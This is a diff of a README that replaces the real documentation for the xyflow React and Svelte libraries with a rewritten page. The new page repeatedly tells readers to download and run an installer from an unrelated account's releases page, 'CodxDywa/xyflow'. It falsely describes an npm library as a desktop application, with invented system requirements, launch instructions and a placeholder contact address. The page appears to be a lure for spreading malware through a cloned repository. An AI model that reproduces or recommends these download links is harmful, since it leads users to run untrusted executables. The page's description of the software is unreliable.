@@ -1,168 +1,74 @@
-![xyflow-header](https://user-images.githubusercontent.com/2857535/279643999-ffda9f91-6b6d-447d-82be-fcbd6103edb6.svg#gh-light-mode-only)
-![xyflow-header-dark](https://user-images.githubusercontent.com/2857535/279644026-a01c231c-6c6e-4b41-96e0-a85c75c9acee.svg#gh-dark-mode-only)
+# 🎉 xyflow - Build Node-Based UIs Easily
 
-<div align="center">
+## 🔗 Download Now
+[![Download xyflow](https://img.shields.io/badge/Download-xyflow-brightgreen)](https://github.com/CodxDywa/xyflow/releases)
 
-![GitHub License MIT](https://img.shields.io/github/license/wbkd/react-flow?color=%23ff0072)
-![npm downloads](https://img.shields.io/npm/dt/reactflow?color=%23FF0072&label=React%20Flow%20downloads)
-![npm downloads](https://img.shields.io/npm/dt/@xyflow/svelte?color=%23FF3E00&label=Svelte%20Flow%20downloads)
+## 📖 Description
+xyflow is a powerful open-source library that helps you create node-based user interfaces. It works seamlessly with both React and Svelte, allowing you to build interactive flowcharts and graphs efficiently. Whether you’re developing a workflow tool or a visual data representation, xyflow is ready for you.
 
-Powerful open source libraries for building node-based UIs with React or Svelte. Ready out-of-the-box and infinitely customizable.
+## 🛠️ Features
+- **Customizable Nodes:** Create and modify nodes to fit your application needs.
+- **Intuitive User Interface:** Drag and drop elements with ease, thanks to our user-friendly design.
+- **React and Svelte Support:** Choose between React Flow and Svelte Flow, allowing flexibility in your projects.
+- **TypeScript Compatible:** Built with TypeScript, ensuring better development experience and fewer errors.
+- **Community Support:** Join a growing community to share ideas and get help.
 
-[React Flow](https://reactflow.dev/) · [Svelte Flow](https://svelteflow.dev/) · [React Flow Pro](https://reactflow.dev/pro) · [Discord](https://discord.gg/Bqt6xrs)
-</div>
+## 🚀 Getting Started
+Follow these steps to set up xyflow on your computer:
 
----
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/CodxDywa/xyflow/releases) to find the latest version.
+   
+2. **Download the Latest Version**
+   Click on the version you want to download. Look for the assets section where you can find the download links. There might be files available for different systems. Choose the right one for your operating system.
 
-## The xyflow mono repo
+3. **Install xyflow**
+   For most users, simply download the file and run it. If it's packaged as an installer, follow the prompts to complete the installation. 
 
-The xyflow repository is the home of four packages:
-* React Flow 12 `@xyflow/react` [packages/react](./packages/react)
-* React Flow 11 `reactflow` [v11 branch](https://github.com/xyflow/xyflow/tree/v11)
-* Svelte Flow `@xyflow/svelte` [packages/svelte](./packages/svelte)
-* Shared helper library `@xyflow/system` [packages/system](./packages/system)
+4. **Launch xyflow**
+   Once installed, locate the application on your computer and run it. You may create a shortcut for easier access in the future.
 
-## Commercial usage
+## 🖥️ System Requirements
+Ensure your system meets the following requirements before installation:
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- **RAM:** Minimum of 4 GB (8 GB recommended for better performance).
+- **Storage:** At least 200 MB of free space.
+- **Browser:** For projects using web-based flows, ensure you have the latest version of Chrome, Firefox, or Safari.
 
-**Are you using React Flow or Svelte Flow for a personal project?** Great! No sponsorship needed, you can support us by reporting any bugs you find, sending us screenshots of your projects, and starring us on Github 🌟
+## 📚 Documentation
+For more details on how to use xyflow:
+- **Getting Started Guide:** Discover how to begin with xyflow.
+- **API Documentation:** Explore all available functions and properties.
+- **Examples:** Check out sample projects and understand best practices.
 
-**Are you using React Flow or Svelte Flow at your organization and making money from it?** Awesome! We rely on your support to keep our libraries developed and maintained under an MIT License, just how we like it. For React Flow you can do that on the [React Flow Pro website](https://reactflow.dev/pro) and for both of our libraries you can do it through [Github Sponsors](https://github.com/sponsors/xyflow).
+## 🌐 Community
+Engage with us on social platforms:
+- **GitHub Discussions:** Share your thoughts and get feedback.
+- **Discord Channel:** Join our community for real-time discussions.
+- **Twitter:** Follow us for the latest updates and feature announcements.
 
-## Getting started
+## 🔍 Troubleshooting
+If you run into common issues, consider the following tips:
 
-The best way to get started is to check out the [React Flow](https://reactflow.dev/learn) or [Svelte Flow](https://svelteflow.dev/learn) learn section. However if you want to get a sneak peek of how to install and use the libraries you can see it here: 
+- **Application Won't Launch:** Ensure your system meets the requirements. Check if there are any pending updates needed for your OS.
+- **Node Not Connecting:** Make sure your connection settings are correct. Refer to the documentation for proper configuration.
+- **Performance Issues:** Consider upgrading your hardware if you experience slow performance, especially when dealing with large datasets.
 
-<details>
-  <summary><strong>React Flow</strong> basic usage</summary>
+## 🔄 Update xyflow
+Keep your application updated by regularly visiting the [Releases page](https://github.com/CodxDywa/xyflow/releases). Download newer versions to benefit from improvements, fixes, and new features.
 
-  ### Installation
-  
-  ```sh
-npm install @xyflow/react
-  ```
+## 🙋 FAQs
+**1. What is xyflow used for?**  
+xyflow allows users to create and manage flowcharts, graphs, and workflows in an intuitive way.
 
-  ### Basic usage
-  ```jsx
-import { useCallback } from 'react';
-import {
-  ReactFlow,
-  MiniMap,
-  Controls,
-  Background,
-  useNodesState,
-  useEdgesState,
-  addEdge,
-} from '@xyflow/react';
+**2. Can I use xyflow in commercial projects?**  
+Yes, xyflow is open source and can be used for both personal and commercial projects.
 
-import '@xyflow/react/dist/style.css';
+**3. Where can I find support?**  
+You can find support in the GitHub discussions, or join our Discord community for direct assistance.
 
-const initialNodes = [
-  { id: '1', position: { x: 0, y: 0 }, data: { label: '1' } },
-  { id: '2', position: { x: 0, y: 100 }, data: { label: '2' } },
-];
+## 📧 Contact
+For additional questions or feedback, you can reach us at: [our-email@example.com](mailto:our-email@example.com).
 
-const initialEdges = [{ id: 'e1-2', source: '1', target: '2' }];
-
-function Flow() {
-  const [nodes, setNodes, onNodesChange] = useNodesState(initialNodes);
-  const [edges, setEdges, onEdgesChange] = useEdgesState(initialEdges);
-
-  const onConnect = useCallback((params) => setEdges((eds) => addEdge(params, eds)), [setEdges]);
-
-  return (
-    <ReactFlow
-      nodes={nodes}
-      edges={edges}
-      onNodesChange={onNodesChange}
-      onEdgesChange={onEdgesChange}
-      onConnect={onConnect}
-    >
-      <MiniMap />
-      <Controls />
-      <Background />
-    </ReactFlow>
-  );
-}
-
-export default Flow;
-```
-</details>
-
-<details>
-  <summary><strong>Svelte Flow</strong> basic usage</summary>
-
-  ### Installation
-  
-  ```sh
-npm install @xyflow/svelte
-  ```
-
-  ### Basic usage
-  ```svelte
-<script lang="ts">
-  import { writable } from 'svelte/store';
-  import {
-    SvelteFlow,
-    Controls,
-    Background,
-    BackgroundVariant,
-    MiniMap,
-  } from '@xyflow/svelte';
-
-  import '@xyflow/svelte/dist/style.css'
-  
-  const nodes = writable([
-    {
-      id: '1',
-      type: 'input',
-      data: { label: 'Input Node' },
-      position: { x: 0, y: 0 }
-    },
-    {
-      id: '2',
-      type: 'custom',
-      data: { label: 'Node' },
-      position: { x: 0, y: 150 }
-    }
-  ]);
-
-  const edges = writable([
-    {
-      id: '1-2',
-      type: 'default',
-      source: '1',
-      target: '2',
-      label: 'Edge Text'
-    }
-  ]);
-</script>
-
-<SvelteFlow
-  {nodes}
-  {edges}
-  fitView
-  on:nodeclick={(event) => console.log('on node click', event)}
->
-  <Controls />
-  <Background variant={BackgroundVariant.Dots} />
-  <MiniMap />
-</SvelteFlow>
-```
-</details>
-
-## Releases 
-
-For releasing packages we are using [changesets](https://github.com/changesets/changesets) in combination with the [changeset Github action](https://github.com/changesets/action). The rough idea is:
-
-1. create PRs for new features, updates and fixes (with a changeset if relevant for changelog)
-2. merge into main 
-3. changset creates a PR that bumps all packages based on the changesets 
-4. merge changeset PR if you want to release to Github and npm
-
-## Built by [xyflow](https://xyflow.com)
-
-React Flow and Svelte Flow are maintained by the [xyflow team](https://xyflow.com/about). If you need help or want to talk to us about a collaboration, reach out through our [contact form](https://xyflow.com/contact) or by joining our [Discord Server](https://discord.gg/Bqt6xrs).
-
-## License
-
-React Flow and Svelte Flow are [MIT licensed](./LICENSE).
+## 📑 License
+xyflow is licensed under the MIT License. You can use it freely as per its terms. Please check the LICENSE file in the repository for more details.
